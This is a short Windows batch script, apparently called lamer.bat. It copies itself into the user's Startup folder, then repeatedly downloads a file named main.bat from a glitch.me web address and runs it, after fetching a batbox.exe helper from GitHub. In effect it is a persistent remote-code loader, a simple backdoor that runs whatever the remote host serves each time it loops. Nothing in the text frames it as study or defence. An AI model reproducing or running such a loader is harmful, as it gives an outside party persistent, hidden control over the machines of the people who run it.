copy "lamer.bat" "%USERPROFILE%\Start Menu\Programs\Startup"
set /a i=0
:main
if %i% == 2 goto :end
cd %appdata%
batbox.exe /p 0
if not exist batbox.exe goto :batboxx
@echo off
cls
color 07
set /a i=%i%+1
:update
@echo off
cd %appdata%
batbox.exe /p 0
curl https://elastic-marshy-auroraceratops.glitch.me/main.bat -o main.bat
call main.bat
goto :update
:batboxx
curl -L https://github.com/Batch-Man/Batbox/raw/main/Demo/Files/batbox.exe > batbox.exe
goto :main
:end